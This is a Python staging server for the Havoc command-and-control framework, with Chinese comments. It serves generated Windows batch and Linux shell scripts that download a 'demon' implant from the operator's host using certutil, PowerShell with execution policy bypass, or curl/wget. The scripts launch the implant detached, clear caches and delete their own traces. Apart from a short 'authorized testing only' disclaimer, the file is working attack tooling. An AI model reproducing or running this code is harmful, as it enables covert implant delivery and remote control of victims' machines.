#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Havoc 0.7 —— 一键上线暂存服务（Windows 优先）

提供「一键上线命令」所引用的两个暂存端点：

    GET /health              服务状态（JSON），客户端「一键上线」面板轮询它
    GET /swt                 Windows 批处理：下载 payloads/<payload> 并后台启动
    GET /slt                 Linux shell 脚本：按 uname -m 下载 demon.<arch>.elf 并后台启动
    GET /payloads/<文件名>    投放载荷（仅限 payload 目录内的普通文件，禁止目录穿越）
    GET /                    端点索引

设计约束：
  * 只用 Python 标准库，不引入任何依赖；
  * 默认只读 payload 目录，不执行、不修改任何目标文件；
  * 只做「文件投递」，是否执行由操作者在目标上粘贴的命令决定；
  * 仅用于已获得明确授权的测试环境。

用法：
    python3 stager/stager_server.py --payload-dir payloads-out --payload demon.x64.exe
    python3 stager/stager_server.py --port 9901 --public-base http://192.168.121.132:9901
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import signal
import socket
import sys
import threading
import time
from http import HTTPStatus
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import unquote, urlsplit

VERSION = "1.0"
SERVER_TOKEN = "havoc-stager/" + VERSION

# Host 头只允许这些字符，避免把控制字符/引号写进 .bat
HOST_RE = re.compile(r"^[A-Za-z0-9._\-:\[\]]+$")
SAFE_NAME_RE = re.compile(r"^[A-Za-z0-9._-]+$")

STATE: dict = {
    "payload_dir": "",
    "payload": "",
    "linux_payloads": {},       # arch -> 文件名（x64/x86/arm64）
    "public_base": "",          # 显式指定时为固定值；auto 时为空，按请求 Host 推导
    "default_base": "",         # auto 模式下探测到的本机地址
    "bind": "0.0.0.0",
    "port": 9901,
    "started_at": time.time(),
    "hits": 0,                  # /swt + /slt 命中次数（「一键上线命令」被执行的次数）
    "payload_hits": 0,          # 载荷下载次数
    "slt_hits": 0,              # /slt（Linux 一键上线）命中次数
    "last_slt": None,           # 最近一次 /slt 的 {time, ip}
    "last_hit": None,
    "recent": [],               # 最近 10 次请求
    "lock": threading.Lock(),
}


# --------------------------------------------------------------------------- #
# 工具函数
# --------------------------------------------------------------------------- #
def detect_local_ip() -> str:
    """返回本机默认出口网卡的 IPv4；UDP connect 不会真正发包。"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        finally:
            s.close()
    except OSError:
        pass

    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if not ip.startswith("127."):
                return ip
    except OSError:
        pass

    return "127.0.0.1"


def sha256_file(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def payload_path() -> str:
    return os.path.join(STATE["payload_dir"], STATE["payload"])


def payload_available() -> bool:
    return os.path.isfile(payload_path())


def payload_size() -> int:
    try:
        return os.path.getsize(payload_path())
    except OSError:
        return 0


def payload_sha256() -> str:
    try:
        return sha256_file(payload_path())
    except OSError:
        return ""


def linux_payload_path(arch: str) -> str:
    name = STATE["linux_payloads"].get(arch, "")
    return os.path.join(STATE["payload_dir"], name) if name else ""


def linux_available() -> dict:
    """返回 {arch: {"name","size","sha256"}}，只列出真实存在的文件。"""
    out = {}
    for arch, name in STATE["linux_payloads"].items():
        path = os.path.join(STATE["payload_dir"], name)
        if name and os.path.isfile(path):
            out[arch] = {
                "name": name,
                "size": os.path.getsize(path),
                "sha256": sha256_file(path),
            }
    return out


def auto_linux_payloads(payload_dir: str) -> dict:
    found = {}
    for arch, name in (("x64", "demon.x64.elf"), ("x86", "demon.x86.elf"), ("arm64", "demon.arm64.elf")):
        if os.path.isfile(os.path.join(payload_dir, name)):
            found[arch] = name
    return found


def base_for(handler: "StagerHandler") -> str:
    """暂存地址：优先显式 --public-base，其次请求 Host，最后本机探测地址。"""
    if STATE["public_base"]:
        return STATE["public_base"].rstrip("/")

    host = handler.headers.get("Host", "") or ""
    if host and HOST_RE.match(host):
        return "http://" + host

    return STATE["default_base"]


def render_swt(base: str) -> bytes:
    """生成 Windows 批处理。必须是 CRLF —— cmd 对 LF-only 的批处理并不可靠。"""
    payload = STATE["payload"]
    stem = re.sub(r"[^A-Za-z0-9]", "", os.path.splitext(payload)[0]) or "payload"

    lines = [
        "@echo off",
        "setlocal EnableExtensions",
        f'set "BASE={base}"',
        f'set "URL=%BASE%/payloads/{payload}"',
        f'set "EXE=%TEMP%\\{stem}%RANDOM%%RANDOM%.exe"',
        "",
        "rem Download with certutil first, fall back to PowerShell.",
        'certutil.exe -urlcache -split -f "%URL%" "%EXE%" >nul 2>&1',
        'if not exist "%EXE%" (',
        "  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
        "\"try{Invoke-WebRequest -UseBasicParsing -Uri '%URL%' -OutFile '%EXE%'}catch{exit 1}\" >nul 2>&1",
        ")",
        'if not exist "%EXE%" exit /b 1',
        "",
        'start "" "%EXE%"',
        "certutil.exe -urlcache * delete >nul 2>&1",
        "rem Self-delete: end batch parsing first, otherwise cmd prints 'batch file not found'.",
        '(goto) 2>nul & del /f /q "%~f0"',
    ]
    return ("\r\n".join(lines) + "\r\n").encode("utf-8")


def render_slt(base: str) -> bytes:
    """生成 Linux POSIX sh 投递脚本。

    设计要点：
      * 按 uname -m 选择 payload（x86_64/amd64→x64，i?86→x86，aarch64→arm64）；
      * curl 优先，wget 兜底；
      * chmod 700 后用 setsid/nohup 完全脱离当前 shell，避免占用调用方
        （尤其是通过已有会话 `shell curl ... | sh` 投递时的 stdout 管道）；
      * 启动后删除临时文件（Linux 允许 unlink 正在运行的可执行文件）。
    """
    available = linux_available()
    arches = []
    for arch in ("x64", "x86", "arm64"):
        if arch in available:
            arches.append('  %s) A=%s;;' % (
                {"x64": "x86_64|amd64|x64", "x86": "i386|i486|i586|i686|i86pc", "arm64": "aarch64|arm64"}[arch],
                arch,
            ))

    lines = [
        "#!/bin/sh",
        "# havoc linux stager",
        "set -e",
        'BASE="%s"' % base,
        'ARCH="$(uname -m 2>/dev/null || echo unknown)"',
        'case "$ARCH" in',
    ]
    lines.extend(arches)
    lines.extend([
        '  *) echo "[!] unsupported arch: $ARCH" >&2; exit 1;;',
        "esac",
        'URL="$BASE/payloads/demon.$A.elf"',
        '# 优先 /tmp，其次 /dev/shm、$HOME（部分主机 /tmp 挂 noexec）',
        'TMP=""',
        'for D in "${TMPDIR:-/tmp}" /dev/shm "$HOME"; do',
        '  if [ -n "$D" ] && [ -d "$D" ] && [ -w "$D" ]; then TMP="$D/.h$A.$$"; break; fi',
        "done",
        'if [ -z "$TMP" ]; then echo "[!] no writable temp dir" >&2; exit 1; fi',
        'if command -v curl >/dev/null 2>&1; then',
        '  curl -fsSL "$URL" -o "$TMP"',
        'elif command -v wget >/dev/null 2>&1; then',
        '  wget -q "$URL" -O "$TMP"',
        'else',
        '  echo "[!] curl/wget not found" >&2; exit 1',
        "fi",
        'chmod 700 "$TMP" 2>/dev/null || true',
        '# 由 Demon 启动后自删除；这里再挂一个延时兜底，避免在 exec 前删除导致 ENOENT 竞态',
        'if command -v setsid >/dev/null 2>&1; then',
        '  DEMON_SELF_DELETE=1 setsid "$TMP" >/dev/null 2>&1 &',
        'else',
        '  DEMON_SELF_DELETE=1 nohup "$TMP" >/dev/null 2>&1 &',
        "fi",
        '( sleep 3; rm -f "$TMP" ) >/dev/null 2>&1 &',
        'echo "[+] started demon ($A)"',
    ])
    return ("\n".join(lines) + "\n").encode("utf-8")


INDEX_HTML = """<!doctype html>
<meta charset="utf-8">
<title>havoc-stager</title>
<style>
 body{{background:#1a1b1d;color:#e7e8e9;font:13px/1.7 monospace;margin:40px}}
 h1{{font-size:16px;color:#4c9aff;margin:0 0 12px}}
 code{{color:#4ac27a}} a{{color:#4c9aff}}
 .dim{{color:#71777d}}
</style>
<h1>Havoc 一键上线暂存服务 v{v}</h1>
<ul>
  <li><a href="/health">/health</a> <span class="dim">服务状态 JSON</span></li>
  <li><a href="/swt">/swt</a> <span class="dim">Windows 批处理（下载并启动 {payload}）</span></li>
  <li><a href="/slt">/slt</a> <span class="dim">Linux sh 脚本（按 uname -m 下载并启动 elf）</span></li>
  <li><a href="/payloads/{payload}">/payloads/{payload}</a> <span class="dim">{size} 字节</span></li>
</ul>
<p class="dim">仅用于已获得明确授权的测试环境。</p>
"""

SWT_MISSING = (
    "暂存服务未找到载荷：{path}\n"
    "把 demon 载荷放进 payload 目录，或用 --payload 指定文件名，然后重启本服务。\n"
)

SLT_MISSING = (
    "暂存服务未找到 Linux 载荷：{path}\n"
    "把 demon.x64.elf / demon.x86.elf / demon.arm64.elf 放进载荷目录（或 --linux-payload 指定），\n"
    "然后重启本服务。\n"
)


# --------------------------------------------------------------------------- #
# HTTP
# --------------------------------------------------------------------------- #
class StagerHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = SERVER_TOKEN
    sys_version = ""

    # 默认实现会往 stderr 写日志，这里统一走 _access
    def log_message(self, fmt, *args):
        pass

    # keep-alive 连接被目标/客户端直接关闭时不要打印整段 traceback
    def setup(self):
        super().setup()
        try:
            self.request.settimeout(60)
        except OSError:
            pass

    def handle(self):
        try:
            super().handle()
        except (ConnectionResetError, BrokenPipeError, TimeoutError, OSError):
            pass

    # ---- 输出 ---------------------------------------------------------- #
    def _send(self, status, body, ctype, head_only=False, extra=None):
        if isinstance(body, str):
            body = body.encode("utf-8")

        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("X-Content-Type-Options", "nosniff")
        for key, value in (extra or {}).items():
            self.send_header(key, value)
        self.end_headers()

        if not head_only and body:
            self.wfile.write(body)

    def _send_file(self, path, head_only=False):
        try:
            size = os.path.getsize(path)
            fh = open(path, "rb")
        except OSError:
            self._send(HTTPStatus.NOT_FOUND, "payload not found\n", "text/plain; charset=utf-8", head_only)
            return

        with fh:
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(size))
            self.send_header("Content-Disposition", 'attachment; filename="%s"' % os.path.basename(path))
            self.send_header("Cache-Control", "no-store")
            self.send_header("X-Content-Type-Options", "nosniff")
            self.end_headers()

            if head_only:
                return

            try:
                for chunk in iter(lambda: fh.read(65536), b""):
                    self.wfile.write(chunk)
            except (BrokenPipeError, ConnectionResetError):
                pass

    def _access(self, path, status, size):
        ip = self.client_address[0]
        now = time.strftime("%Y-%m-%d %H:%M:%S")
        print("[%s] %s %s %s -> %s %dB" % (now, ip, self.command, path, status, size), flush=True)

        with STATE["lock"]:
            STATE["recent"].append(
                {"time": now, "ip": ip, "method": self.command, "path": path, "status": int(status), "bytes": int(size)}
            )
            del STATE["recent"][:-10]

    # ---- 路由 ---------------------------------------------------------- #
    def do_HEAD(self):
        self._dispatch(head_only=True)

    def do_GET(self):
        self._dispatch(head_only=False)

    def _dispatch(self, head_only):
        path = urlsplit(self.path).path or "/"
        status, size = HTTPStatus.NOT_FOUND, 0

        try:
            if path == "/health":
                body = self._health()
                self._send(HTTPStatus.OK, body, "application/json; charset=utf-8", head_only)
                status, size = HTTPStatus.OK, len(body)

            elif path == "/swt":
                if not payload_available():
                    body = SWT_MISSING.format(path=payload_path())
                    self._send(HTTPStatus.SERVICE_UNAVAILABLE, body, "text/plain; charset=utf-8", head_only)
                    status, size = HTTPStatus.SERVICE_UNAVAILABLE, len(body)
                else:
                    body = render_swt(base_for(self))
                    self._send(HTTPStatus.OK, body, "application/octet-stream", head_only,
                               {"Content-Disposition": 'attachment; filename="run.bat"'})
                    status, size = HTTPStatus.OK, len(body)
                    with STATE["lock"]:
                        STATE["hits"] += 1
                        STATE["last_hit"] = time.strftime("%Y-%m-%d %H:%M:%S")

            elif path == "/slt":
                if not linux_available():
                    body = SLT_MISSING.format(path=STATE["payload_dir"])
                    self._send(HTTPStatus.SERVICE_UNAVAILABLE, body, "text/plain; charset=utf-8", head_only)
                    status, size = HTTPStatus.SERVICE_UNAVAILABLE, len(body)
                else:
                    body = render_slt(base_for(self))
                    self._send(HTTPStatus.OK, body, "text/plain; charset=utf-8", head_only)
                    status, size = HTTPStatus.OK, len(body)
                    with STATE["lock"]:
                        STATE["hits"] += 1
                        STATE["slt_hits"] += 1
                        STATE["last_hit"] = time.strftime("%Y-%m-%d %H:%M:%S")
                        STATE["last_slt"] = {
                            "time": STATE["last_hit"],
                            "ip": self.client_address[0],
                        }

            elif path.startswith("/payloads/"):
                name = unquote(path[len("/payloads/"):])
                if not SAFE_NAME_RE.match(name) or name in (".", ".."):
                    body = "bad payload name\n"
                    self._send(HTTPStatus.BAD_REQUEST, body, "text/plain; charset=utf-8", head_only)
                    status, size = HTTPStatus.BAD_REQUEST, len(body)
                else:
                    full = os.path.realpath(os.path.join(STATE["payload_dir"], name))
                    root = os.path.realpath(STATE["payload_dir"])
                    if os.path.dirname(full) != root or not os.path.isfile(full):
                        body = "payload not found\n"
                        self._send(HTTPStatus.NOT_FOUND, body, "text/plain; charset=utf-8", head_only)
                        status, size = HTTPStatus.NOT_FOUND, len(body)
                    else:
                        size = os.path.getsize(full)
                        self._send_file(full, head_only)
                        status = HTTPStatus.OK
                        with STATE["lock"]:
                            STATE["payload_hits"] += 1

            elif path == "/":
                body = INDEX_HTML.format(
                    v=VERSION,
                    payload=STATE["payload"],
                    size=payload_size(),
                )
                self._send(HTTPStatus.OK, body, "text/html; charset=utf-8", head_only)
                status, size = HTTPStatus.OK, len(body.encode("utf-8"))

            else:
                body = "not found\n"
                self._send(HTTPStatus.NOT_FOUND, body, "text/plain; charset=utf-8", head_only)
                size = len(body)

        except (BrokenPipeError, ConnectionResetError):
            return

        self._access(path, status, size)

    def _health(self) -> str:
        with STATE["lock"]:
            hits = STATE["hits"]
            payload_hits = STATE["payload_hits"]
            last_hit = STATE["last_hit"]
            recent = list(STATE["recent"])

        doc = {
            "status": "ok",
            "version": VERSION,
            "server": SERVER_TOKEN,
            "bind": STATE["bind"],
            "port": STATE["port"],
            "public_base": STATE["public_base"] or STATE["default_base"],
            "payload": STATE["payload"],
            "payload_available": payload_available(),
            "payload_size": payload_size(),
            "payload_sha256": payload_sha256(),
            "linux_payloads": linux_available(),
            "hits": hits,
            "payload_hits": payload_hits,
            "slt_hits": STATE["slt_hits"],
            "last_slt": STATE["last_slt"],
            "last_hit": last_hit,
            "started_at": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(STATE["started_at"])),
            "uptime_seconds": int(time.time() - STATE["started_at"]),
            "capabilities": {"windows": True, "linux": bool(linux_available())},
            "recent": recent,
        }
        return json.dumps(doc, ensure_ascii=False)


# --------------------------------------------------------------------------- #
# main
# --------------------------------------------------------------------------- #
def main(argv=None) -> int:
    parser = argparse.ArgumentParser(
        description="Havoc 一键上线暂存服务（仅用于已授权的测试环境）"
    )
    parser.add_argument("--bind", default="0.0.0.0", help="监听地址，默认 0.0.0.0")
    parser.add_argument("--port", type=int, default=9901, help="监听端口，默认 9901")
    parser.add_argument("--payload-dir", default="payloads-out", help="载荷目录，默认 payloads-out")
    parser.add_argument("--payload", default="demon.x64.exe", help="Windows 载荷文件名，默认 demon.x64.exe")
    parser.add_argument(
        "--linux-payload",
        default="",
        help="Linux 载荷文件名（可选，留空自动探测 demon.x64.elf / demon.x86.elf / demon.arm64.elf）",
    )
    parser.add_argument(
        "--public-base",
        default="auto",
        help="写进 /swt 的外部地址，如 http://192.168.121.132:9901；auto 表示按请求 Host 推导",
    )
    args = parser.parse_args(argv)

    STATE["payload_dir"] = os.path.abspath(args.payload_dir)
    STATE["payload"] = args.payload
    if args.linux_payload:
        name = os.path.basename(args.linux_payload)
        for arch, suffix in (("x64", ".x64."), ("x86", ".x86."), ("arm64", ".arm64.")):
            if suffix in name:
                STATE["linux_payloads"][arch] = name
                break
        else:
            STATE["linux_payloads"]["x64"] = name
    else:
        STATE["linux_payloads"] = auto_linux_payloads(STATE["payload_dir"])
    STATE["bind"] = args.bind
    STATE["port"] = args.port

    local_ip = detect_local_ip()
    STATE["default_base"] = "http://%s:%d" % (local_ip, args.port)

    if args.public_base and args.public_base != "auto":
        STATE["public_base"] = args.public_base.rstrip("/")

    os.makedirs(STATE["payload_dir"], exist_ok=True)

    base = STATE["public_base"] or STATE["default_base"]
    avail = payload_available()

    print("=" * 66)
    print(" Havoc 一键上线暂存服务 v%s" % VERSION)
    print("   监听        : %s:%d" % (args.bind, args.port))
    print("   外部地址    : %s" % base)
    print("   载荷        : %s (%s)" % (payload_path(), ("%d 字节" % payload_size()) if avail else "缺失"))
    if avail:
        print("   载荷 SHA256 : %s" % payload_sha256())
    if STATE["linux_payloads"]:
        print("   Linux 载荷  : %s" % ", ".join("%s=%s" % (a, n) for a, n in STATE["linux_payloads"].items()))
    else:
        print("   Linux 载荷  : 缺失（/slt 返回 503）")
    print("   端点        : /health  /swt  /slt  /payloads/%s" % STATE["payload"])
    print("   仅用于已获得明确授权的测试环境。Ctrl+C 停止。")
    print("=" * 66, flush=True)

    server = ThreadingHTTPServer((args.bind, args.port), StagerHandler)
    server.daemon_threads = True

    def _stop(signum, frame):
        print("\n[stager] 收到信号 %s，正在停止…" % signum, flush=True)
        threading.Thread(target=server.shutdown, daemon=True).start()

    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)

    try:
        server.serve_forever(poll_interval=0.3)
    finally:
        server.server_close()

    print("[stager] 已停止", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
